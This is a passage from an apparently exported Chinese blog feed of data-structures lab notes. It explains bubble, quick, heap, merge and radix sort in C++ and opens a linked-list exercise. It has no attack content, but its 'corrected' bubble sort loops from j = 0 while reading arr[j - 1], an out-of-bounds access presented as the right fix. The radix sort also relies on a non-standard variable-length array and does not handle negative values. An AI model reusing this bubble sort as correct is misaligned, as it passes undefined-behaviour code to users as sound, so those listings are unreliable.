<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::bubbleSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> exchange = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len &amp;&amp; exchange) &#123;</span><br><span class="line">        exchange = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j - <span class="number">1</span>] &gt; arr[j]) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = arr[j - <span class="number">1</span>];</span><br><span class="line">                arr[j - <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">                exchange = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时运行发现并<strong>不能</strong>得出正确的排序结果。仔细观察排序结果可以发现，前若干项的顺序依旧很混乱，而末尾几项却是正确的升序。</p>
<p>经过几次的调整，发现当第6行的<code>for</code>循环改为这样就可以正确排序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = len - <span class="number">1</span>; j &gt; i; j--)</span><br></pre></td></tr></table></figure>
<p>只不过是把正序遍历改为了逆序遍历，而且都在<code>i+1</code>和<code>len-1</code>之间，这两种形式有何不同？</p>
<hr>
<p>回到我们的思路。</p>
<p>我们需要遍历若干次，将每次的最大项移动到区间的末尾。</p>
<ul>
<li><p><code>for (int j = len - 1; j &gt; i; j--)</code>的过程是从后向前遍历，如果某一项比前一项小，就交换。最终把区间内的最小项移动到区间的开头。</p>
<p>由于<code>i</code>是从<code>0</code>到<code>len-1</code>的，所以整体来看，就是第一次遍历（<code>len-1</code>到<code>0</code>）把最小项移动到数组第0位；第二次遍历（<code>len-1</code>到<code>1</code>）把剩下的最小项移动到第1位……以此类推。</p>
</li>
<li><p>而<code>for (int j = i + 1; j &lt; len; j++)</code>却出现了错误。它第一次遍历（<code>0</code>到<code>len-1</code>）把最大项移动到了末尾；第二次遍历（<code>1</code>到<code>len-1</code>）却把<code>1</code>～<code>len-1</code>部分的最大项移动到了倒数第二位，忽略了第<code>0</code>项；第三次遍历（<code>2</code>到<code>len-1</code>）忽略了前两项；第四次遍历（<code>3</code>到<code>len-1</code>）忽略了前三项……</p>
<p>正确的遍历是从<code>0</code>开始，即从<code>0</code>遍历到<code>len-1</code>时，数组中的最大项移动到了末尾，下一次只需从<code>0</code>遍历到<code>len-2</code>，即可从前<code>len-1</code>项中找到整个数组的次大项，移动到倒数第二位……以此类推。</p>
<p>所以正确的写法应该是<code>for (int j = 0; j &lt; len - i; j++)</code>。</p>
</li>
</ul>
<p>修改后的算法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::bubbleSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> exchange = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; len &amp;&amp; exchange) &#123;</span><br><span class="line">        exchange = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len - i; j++) &#123;</span><br><span class="line">     <span class="comment">// for (int j = len - 1; j &gt; i; j--) &#123;</span></span><br><span class="line">            <span class="keyword">if</span> (arr[j - <span class="number">1</span>] &gt; arr[j]) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = arr[j - <span class="number">1</span>];</span><br><span class="line">                arr[j - <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">                exchange = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="quickSort"><a href="#quickSort" class="headerlink" title="quickSort"></a>quickSort</h1><p>快速排序的思路就是一种分治的思想，在数组中取一个基准，将所有不超过它的元素移动到它的左侧，并将所有不小于它的元素移动到它的右侧，再对划分出的两个子序列重复以上操作。</p>
<p>假设取每次区间的第一个元素（值为<code>key</code>）为基准，从右向左找到第一个比它小的元素<code>s</code>放到最左侧，从左向右找到第一个比它大的元素放到<code>s</code>的位置。重复以上操作，直至基准元素的位置确定，再把它的值<code>key</code>放到此处。</p>
<p>此时再对基准元素左右两侧的子序列重复以上操作，即可将所有元素的位置确定。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::qSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = low;</span><br><span class="line">        <span class="keyword">int</span> j = high;</span><br><span class="line">        <span class="keyword">int</span> key = arr[low];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt;= key)</span><br><span class="line">                j--;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">                arr[i++] = arr[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= key)</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">                arr[j--] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[i] = key;</span><br><span class="line">        qSort(arr, low, i - <span class="number">1</span>);</span><br><span class="line">        qSort(arr, i + <span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接调用递归函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::quickSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    qSort(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="heapSort"><a href="#heapSort" class="headerlink" title="heapSort"></a>heapSort</h1><p>什么是堆排序？</p>
<p>首先要知道什么是堆。堆是一棵完全二叉树，满足：</p>
<ul>
<li>按照顺序存储方式存放于一个数组中（自顶向下、自左向右编号）；</li>
<li>任意结点的值均不小于它的所有子结点（称为“大顶堆/最大堆”），或任意结点的值均不超过它的所有子结点（称为“小顶堆/最小堆”）。</li>
</ul>
<p>可以发现：</p>
<ul>
<li><p>从堆的第一个特性可以看出：设某结点为数组中的第<code>i</code>个元素，则其左子结点（如果有）为数组中的第<code>2*i+1</code>个元素，右子结点（如果有）为数组中的第<code>2*i+2</code>个元素（均从0开始）。</p>
<p>这样我们就不必构造一颗二叉树，只需按此规律在数组中进行模拟二叉树的操作即可。</p>
</li>
<li><p>从堆的第二个特性可以看出：若堆为大顶堆，则根结点的值为整个序列的最大值；若堆为小顶堆，则根结点的值为整个序列的最小值。</p>
<p>这就为我们的排序提供了一个很好的方法。按照我们进行冒泡排序的思路，只需将数组调整为<strong>大顶堆</strong>，并将其第一个元素（大顶堆的根结点，最大值）移动到最后，再将剩下的元素继续调整为大顶堆，再将其第一个元素（剩余大顶堆的根结点，剩余元素中的最大值）移动到倒数第二位……以此类推，便可得到一个升序序列。这就是<strong>堆排序（heap sort）</strong>。</p>
</li>
</ul>
<p>根据以上思路，堆排序一共分为两部分：</p>
<ul>
<li><strong>调整</strong>数组指定区间元素为大顶堆；</li>
<li>将数组第一个元素与区间末尾的元素进行<strong>交换</strong>。</li>
</ul>
<p>只需反复进行调整-&gt;交换-&gt;调整-&gt;交换-&gt;调整……即可完成排序。</p>
<p>首先将乱序的数组进行一次调整。由于调整针对的是非叶结点，所以从最后一个有叶子的非叶结点开始，<strong>逐个</strong>向前调整。</p>
<p><em>注：不能从前向后调整，否则会导致真正的最大值无法上移到根结点。此处的调整为逐个调整，因为开始时为乱序。</em></p>
<p>其次进行交换。根据冒泡排序的思路，将待排区间逐个前移，即每次均从<code>0</code>开始，结束的位置由<code>len-1</code>依次向前。</p>
<p>最后是每次交换后的调整。</p>
<p><em>注：此处的调整为从<code>0</code>开始的调整。因为前一步操作只是改变了第<code>0</code>个元素，而其他部分仍保持大顶堆结构。</em></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::heapSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        heapAdjust(arr, i, len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[<span class="number">0</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = arr[i];</span><br><span class="line">        arr[i] = temp;</span><br><span class="line">        heapAdjust(arr, <span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于具体调整的操作，我们设调整开始的结点值为数组的第<code>s</code>个元素，待排区间的长度为<code>size</code>。</p>
<p>我们应该将第<code>s</code>个元素<code>temp</code>与它的子结点的值进行比较（适当向下寻找，找到较大值），如果子结点值较大则放到<code>s</code>处，否则说明子结点值均小于<code>s</code>元素，结束调整；再将子结点的值与子结点的子结点的值进行比较……以此类推。</p>
<p><em>注：下面的叙述中，将完全二叉树的所有叶结点称为“第一层”，以此向上的每层结点为“第二层”、“第三层”等。</em></p>
<p>对于第一种的逐个调整，由于顺序是从后向前，则前若干次调整即可将第一层中的值较大者放到对应的第二层处，重复进行即可不重不漏地建立大顶堆。</p>
<p>对于第二种的从0调整，由于基本上保持了大顶堆的结构，所以等价于沿着值较大的子结点一直找到剩余元素中的最大值，未选择的子结点及其子树的值必全部小于所选择的子结点的值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MySort::heapAdjust</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> s, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = arr[s];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> * s + <span class="number">1</span>; i &lt; size; i = <span class="number">2</span> * i + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; size - <span class="number">1</span> &amp;&amp; arr[i] &lt; arr[i + <span class="number">1</span>])</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span> (temp &gt;= arr[i])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        arr[s] = arr[i];</span><br><span class="line">        s = i;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[s] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会「归并排序」和「基数排序」？</title>
    <url>/Data-Structures-Experiment-17/</url>
    <content><![CDATA[<p>Data Structures Experiment #17 - 排序2</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>在<code>MySort.cpp</code>中完成两个排序方法：</p>
<ul>
<li><p><code>mergeSort(int* arr, int len);</code></p>
<p>实现归并排序，需要排序的数组为<code>arr</code>，数组长度为<code>len</code></p>
</li>
<li><p><code>cardSort(int* arr, int len);</code></p>
<p>实现基数排序，需要排序的数组为<code>arr</code>，数组长度为<code>len</code></p>
<p>整数基数排序的一个方法：可以逐位取<code>&amp;</code>获得不同位的信息。例如，第一趟基数排序时，将序列中的数字(<code>a &amp; 0xf0000000</code>)，就得到了最高四位的数值，可以首先对最高位比较大小并进行排序。</p>
</li>
</ul>
</blockquote>
<h1 id="mergeSort"><a href="#mergeSort" class="headerlink" title="mergeSort"></a>mergeSort</h1><p>归并排序仍然是一种“分治”的思想，即将数组分成两部分，分别对其排序，再依次取两个有序数组中较小的元素，将两个数组“归并”成一个数组。只要不断地将数组一分为二，再分别归并，就能完成对这个数组的排序。</p>
<p>可以看出此处为递归函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span>* left = <span class="keyword">new</span> <span class="keyword">int</span>[mid];</span><br><span class="line">    <span class="keyword">int</span>* right = <span class="keyword">new</span> <span class="keyword">int</span>[len - mid];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mid; i++)</span><br><span class="line">        left[i] = arr[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - mid; i++)</span><br><span class="line">        right[i] = arr[i + mid];</span><br><span class="line">    </span><br><span class="line">    mergeSort(left, mid);</span><br><span class="line">    mergeSort(right, len - mid);</span><br><span class="line"></span><br><span class="line">    merge(left, mid, right, len - mid, arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] left;</span><br><span class="line">    <span class="keyword">delete</span>[] right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先一分为二（若此时数组大小已经小于2，即停止递归），左半部分存入<code>left</code>，右半部分存入<code>right</code> ，再进行递归，最后<code>merge</code>函数实现归并：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>* left, <span class="keyword">int</span> leftCount, <span class="keyword">int</span>* right, <span class="keyword">int</span> rightCount, <span class="keyword">int</span>* result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (i &lt; leftCount &amp;&amp; j &lt; rightCount) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[i] &lt; right[j])</span><br><span class="line">            result[k++] = left[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            result[k++] = right[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (i &lt; leftCount)</span><br><span class="line">        result[k++] = left[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt; rightCount)</span><br><span class="line">        result[k++] = right[j++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入参数分别为：左半数组以及它的大小、右半数组以及它的大小、归并存入的数组。</p>
<p>递归的过程想象成二叉树，从叶结点开始。因为第一层递归时两边数组大小均为1，所以只需判断并找出左侧和右侧中较小的一个存入第一位，剩下那个存入第二位即可。第二层递归时两边的数组都是经过第一层之后的，自然都是有序的，后续递归也是如此。</p>
<p>注意，下面两个<code>while</code>循环只会执行一个。</p>
<h1 id="cardSort"><a href="#cardSort" class="headerlink" title="cardSort"></a>cardSort</h1><p>基数排序和归并排序的思想相同，仍进行“分治”，只不过“分”的不是数组，而是每个数值。</p>
<p>假设对一个值全是两位数的数组排序，直接排序较为困难，我们可以先大致排一下序，即将0～9的分到一组、将10～19的分到一组……这样先按照十位数排好序，再分别对每一组的数值按个位数排序，就可以完成整体的排序。这种方法就是<strong>最高位优先法</strong>。</p>
<p>也可以反过来，即先按个位数排好序，再按十位数排序。这种方法就是<strong>最低位优先法</strong>，它和最高位优先法相比，优点是无需分组，因为最终的有序序列中，十位数相同的数值的个位数一定是按升序排列的。</p>
<p>所以我选择最低位优先法。下面看一下基数排序具体是如何实现的。</p>
<hr>
<p>首先定义一些变量：</p>
<ul>
<li><p><code>maxBits</code>是整个数组最大元素的位数（十进制），用于决定我们要循环多少次。</p>
<p>因为一次循环是对当前位的排序。第一次对个位数排好序后，第二次再对十位数排序时，两个十位数相同的元素，较后的一定比较前的元素大。</p>
</li>
<li><p><code>curBits</code>是当前元素的位数（十进制），<code>curNum</code>是当前元素。</p>
<p>这两个变量只在寻找<code>maxBits</code>时用到。</p>
</li>
<li><p><code>curBit</code>是当前循环正在比较的位（十进制），如个位是<code>1</code>、十位是<code>10</code>、百位是<code>100</code>等等。配合下面两个变量效果更佳。</p>
</li>
<li><p><code>MSBits</code>是当前元素的最高若干位（十进制），<code>LSBit</code>是<code>MSBits</code>中最低的一位。</p>
<p>显而易见，这两个变量在循环中比较某一位时会用到。用当前元素除以<code>curBit</code>即为<code>MSBits</code>，再<code>% 10</code>即为<code>LSBit</code>。</p>
<p>其实也可以不另取变量，此处只为提高可读性。</p>
</li>
<li><p><code>group</code>数组作为一个函数（数学意义上），存储某一位上元素的个数（后续还会进行改进）。</p>
<p>若<code>group[x]</code>的值为<code>y</code>，则意味着当前循环中，最低位为<code>x</code>的元素有<code>y</code>个。<code>x</code>的取值范围为0～9，共10个元素的大小。</p>
</li>
<li><p><code>result</code>数组用于存放当前循环排好序的序列，最终再copy给<code>arr</code>数组。</p>
</li>
<li><p><code>i</code>和<code>j</code>用于<code>for</code>循环的索引。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> maxBits = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> curBits, curNum, curBit;</span><br><span class="line"><span class="keyword">int</span> MSBits, LSBit;</span><br><span class="line"><span class="keyword">int</span> group[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> result[len];</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br></pre></td></tr></table></figure>
<hr>
<p>其次就是第一步，找到最大位数<code>maxBits</code>：</p>
<p>遍历整个数组，找到最大的位数。</p>
<p>求位数的方法就是一直除以<code>10</code>（“右移”一位），直到结果为<code>0</code>，看它除了多少次。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    curNum = arr[i];</span><br><span class="line">    curBits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (curNum) &#123;</span><br><span class="line">        curBits++;</span><br><span class="line">        curNum /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    maxBits = (curBits &gt; maxBits) ? curBits : maxBits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>最后是核心的循环部分（代码已截断）：</p>
<p>初始时<code>curBit</code>为1，代表此次循环针对的是个位数，此后每次循环<code>curBit</code>自增十倍，代表更高位。</p>
<p>每次循环开始时都要初始化<code>group</code>数组为全0用于计数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, curBit = <span class="number">1</span>; i &lt; maxBits; i++, curBit *= <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">        group[j] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>此处的<code>for</code>循环用于给<code>group</code>数组赋值。第2～3行为固定操作，取了当前排序的位。将<code>group</code>中对应位置的计数增1即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">    MSBits = arr[j] / curBit;</span><br><span class="line">    LSBit = MSBits % <span class="number">10</span>;</span><br><span class="line">    group[LSBit]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，为了简化排序，后续操作中我不再对<code>arr</code>进行交换，而是直接将对应元素复制到另一个<code>result</code>数组。那么此时“应该复制到哪个位置”就是需要解决的问题。</p>
<p>由于上一步得到的<code>group</code>数组已经存放了对应位的个数，那么我们只需将<code>group[1]</code>加上<code>group[0]</code>，就得到了当前位为<code>1</code>的元素在数组中的终止位置，后续也是如此。</p>
<p>注意数组从0开始，需先将<code>group[0]</code>自减1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">group[<span class="number">0</span>]--;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">    group[j] += group[j - <span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<p>其次是核心中的核心，将<code>arr</code>数组复制到<code>result</code>的对应位置。</p>
<p>上一步已经计算出了当前位为0、1、2……9的元素们各自在数组中的终止位置，即我们已经将数组分块并大致排好了顺序；且上一次循环已经将当前位的下一位排好序（第一次除外），即我们可以对每一块进行更细的排序。所以我们只需<strong>从后向前遍历</strong>（保证每一块的元素从大到小），并将元素存入对应的终止位置，存入后终止位置自减1，最后即可得到我们想要的排好序的<code>result</code>序列。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = len - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">    MSBits = arr[j] / curBit;</span><br><span class="line">    LSBit = MSBits % <span class="number">10</span>;</span><br><span class="line">    result[group[LSBit]--] = arr[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时的<code>arr</code>数组只是作为每次循环的传递作用，故最后将得到的<code>result</code>数组拷贝到<code>arr</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">            arr[j] = result[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>完整代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cardSort</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxBits = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> curBits, curNum, curBit;</span><br><span class="line">    <span class="keyword">int</span> MSBits, LSBit;</span><br><span class="line">    <span class="keyword">int</span> group[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> result[len];</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        curNum = arr[i];</span><br><span class="line">        curBits = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (curNum) &#123;</span><br><span class="line">            curBits++;</span><br><span class="line">            curNum /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        maxBits = (curBits &gt; maxBits) ? curBits : maxBits;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, curBit = <span class="number">1</span>; i &lt; maxBits; i++, curBit *= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">            group[j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">            MSBits = arr[j] / curBit;</span><br><span class="line">            LSBit = MSBits % <span class="number">10</span>;</span><br><span class="line">            group[LSBit]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        group[<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">            group[j] += group[j - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = len - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            MSBits = arr[j] / curBit;</span><br><span class="line">            LSBit = MSBits % <span class="number">10</span>;</span><br><span class="line">            result[group[LSBit]--] = arr[j];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">            arr[j] = result[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会操作「链表」？</title>
    <url>/Data-Structures-Experiment-2/</url>
    <content><![CDATA[<p>Data Structures Experiment #2 - 使用给出的模板，实现链表的基本操作。</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<ul>
<li><p><code>LinkList();</code><br>构造函数，构造一个<code>LinkList</code>，初始化内部的成员变量。</p>
</li>
<li><p><code>void insert(const int&amp; data, const int&amp; location);</code><br>将<code>data</code>插入<code>location</code>中。其中<code>location</code>的计数从<code>0</code>开始，并且测试时会保证<code>location</code>小于等于元素的个数。</p>
</li>
<li><p><code>int length();</code><br>返回链表中元素的个数。</p>
</li>
<li><p>bool remove(const int&amp; location);<br>删除位置为<code>location</code>的元素，如果<code>location</code>不合法，则返回<code>false</code>。删除成功则返回<code>true</code>。</p>
</li>
<li><p><code>int getData(const int&amp; location);</code><br>返回位置为<code>location</code>的元素。</p>
</li>
<li><p><code>void converse();</code><br>要求可以对链表实现翻转<br>例如：</p>
<ul>
<li>链表中内容为 1 2 3 4 5</li>
<li>倒置后为        5 4 3 2 1</li>
</ul>
</li>
<li><p><code>void append(LinkList&amp; append_list);</code><br>要求可以将<code>append_list</code>扩充到链表中，需要对<code>append_list</code>中的元素实现深拷贝。</p>
<p>例如： </p>
<ul>
<li>原始的list : 1 2 3     append_list:  2 3 4</li>
<li>调用<code>append(append_list)</code>后: 1 2 3 2 3 4 </li>
</ul>
</li>
<li><p><code>～LinkList();</code><br>析构函数。</p>
</li>
</ul>
</blockquote>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>将头指针赋为空。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LinkList::LinkList()&#123;</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-length"><a href="#0x02-length" class="headerlink" title="0x02 length"></a>0x02 length</h1><p>直接返回长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkList::length</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-getData"><a href="#0x03-getData" class="headerlink" title="0x03 getData"></a>0x03 getData</h1><p>沿链表遍历到对应位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkList::getData</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> &amp;location)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; location; i++)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-insert"><a href="#0x04-insert" class="headerlink" title="0x04 insert"></a>0x04 insert</h1><p>尾插法分情况：</p>
<ul>
<li><p>当表为空时，直接插入到<code>head</code>处；</p>
</li>
<li><p>当表不空时，指针沿链表移动到前一个位置，断开并重新链接。</p>
</li>
</ul>
<p>长度加1。</p>
